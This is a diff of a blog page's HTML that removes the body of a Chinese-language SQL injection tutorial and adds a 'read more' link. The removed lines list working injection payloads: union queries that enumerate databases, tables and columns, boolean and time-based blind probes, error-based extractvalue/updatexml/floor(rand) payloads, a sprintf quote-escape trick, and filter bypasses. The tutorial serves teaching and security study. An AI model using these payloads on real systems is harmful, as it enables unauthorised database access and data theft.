@@ -188,103 +188,6 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h4 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h4><p>SQL注入有许多类型：按参数分类有：数字型注入与字符型注入；<br>    按返回结果分类有： 报错注入 盲注入；</p>
-<h4 id="注入操作"><a href="#注入操作" class="headerlink" title="注入操作"></a>注入操作</h4><ol>
-<li><p>判断数字型注入与字符型注入<br>id=1         正确<br>id=1’        错误<br>id=1 and 1=1 正确<br>id=1 and 1=2 错误<br>则根据上述情况一般可以确定为数字型注入；<br>字符型注入要注意闭合的符号，可能有单引号，双引号，括号等；形式多样注意巧妙辨别；</p>
-</li>
-<li><p>注入的一般语句<br>使用 order by 确定字段数 并判断回显位置；<br>查库名 id= -1 union select schema_name from information_schema.schemata –+<br>查某库所有表名 id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=”库名” –+<br>查表中所有字段 id= -1 union select group_concat(column_name) from information_schema.columns where table_schema=”库名” and table_name=”表名”  –+<br>查字段的值 id=-1 union select 字段名 from 表名 –+</p>
-</li>
-<li><p>盲注入</p>
-<ol>
-<li>盲注入分为：基于时间盲注入与基于布尔的盲注入；</li>
-<li>相关函数：<ol>
-<li>sleep() 延时返回</li>
-<li>substr(string,n,m)从字符串的第n个位置开始截取m个字符</li>
-<li>if(expr1,expr2,expr3) 当expr1正确时执行expr2,否则执行expr3;</li>
-</ol>
-</li>
-<li>基于布尔的盲注入：当页面子只返回查询的正确与错误，而不反回具体内容时适用；<ol>
-<li>id=1 and length(database())&gt;n –+ 判断数据库的名字长度；</li>
-<li>id=1 and substr(database(),1,1)&gt;’字符’ –+ 判断数据库名字；</li>
-<li>id=1 and substr((select table_name from information_schema.tables where table_schema=datbase() limit 0,1), 1, 1 )=’字符’ –+ 判断表名；</li>
-<li>id=1 and substr((select column_name from information_schema.columns where table_schema=datbase() and table_name=’表名’ limit 0,1), 1, 1 )=’字符’ –+ 判断字段；</li>
-<li>id=1 and substr((select 字段 from 表名 limit 0,1))=’’ –+ 判断值；</li>
-</ol>
-</li>
-</ol>
-</li>
-<li><p>延时注入：适用与页面回显不变时；</p>
-<ol>
-<li>id=1 and if((database()=’’),sleep(3),null)；其余类似只需要改变判断条件即可；</li>
-</ol>
-</li>
-<li><p>报错注入（利用数据库的报错信息来获取我们需要的东西）</p>
-</li>
-<li><table>
-<thead>
-<tr>
-<th>函数</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>count()</td>
-<td>统计select 返回的记录条数</td>
-</tr>
-<tr>
-<td>concat()</td>
-<td>字符串连接功能</td>
-</tr>
-<tr>
-<td>floor()</td>
-<td>向下取整</td>
-</tr>
-<tr>
-<td>rand()</td>
-<td>生成0~1 之间的随机浮点数</td>
-</tr>
-<tr>
-<td>group    by</td>
-<td>根据一个或多个列对结果进行排序</td>
-</tr>
-<tr>
-<td>floor(rand(0)*2)</td>
-<td>产生随机数0或1</td>
-</tr>
-<tr>
-<td>updatexml()</td>
-<td>mysql 5.1.5</td>
-</tr>
-<tr>
-<td>extractvalue()</td>
-<td>mysql 5.1.5</td>
-</tr>
-</tbody></table>
-</li>
-<li><p>函数利用</p>
-<ol>
-<li>id=1 and select count(*), concat( (…) , 0x7e , floor(rand(0)*2))x from information_schema.tables group by x –+；</li>
-<li>id=1 and select 1 from (select counut(*), concat( (….) , 0x7e , floor(rand(0)*2) )x from information_schema.tables group by x )a –+；</li>
-<li>id=1 and extractvalue(1, concat(0x7e,(….),0x7e)) –+ 报错信息最多32位；</li>
-<li>id=1 and updatexml(1,concat(0x7e,(…),0x7e ),1) –+ 报错信息最多32位；</li>
-</ol>
-</li>
-<li><p>格式化注入</p>
-<ol>
-<li>sprintf()将格式化字符串写入变量中；</li>
-<li>sprintf(format,arg1,arg2,arg++) arg1,arg2,arg++会被插入到主字符串中的%处，该函数逐步执行，若%多于arg参数，则必须使用占位符，占位符位于%后且由数字与$组成；</li>
-<li>该函数的php源码中只对15种类型的字符做了匹配，其他字符直接break跳出，这样它就可以吃掉转义字符,若%后有\，那么PHP会把\当作一个格式化字符的类型而吃掉,最后%\或%1$\被替换为空；</li>
-<li>addslashes() 在单引号，双引号，反斜杠，NULL 前加反斜杠进行转义；</li>
-<li>输入 %1$’ 变成 %1$&#39; 单引号成功逃逸；</li>
-</ol>
-</li>
-</ol>
-<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ol>
-<li>双写绕过；oorr  ununionion seselectlect ……</li>
-<li>大小写绕过</li>
-<li>编码绕过:URL全编码（由于服务器会对URL编码进行一次解码，所以需要编码两次）；</li>
-<li>内联注释绕过</li>
-</ol>
-
       
     </div>
     
@@ -296,6 +199,10 @@
       
       <div class="clearfix"></div>
     </div>
+      
+        <p class="article-more-link">
+          <a  href="/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/#more">more >></a>
+        </p>
       
     
   </div>
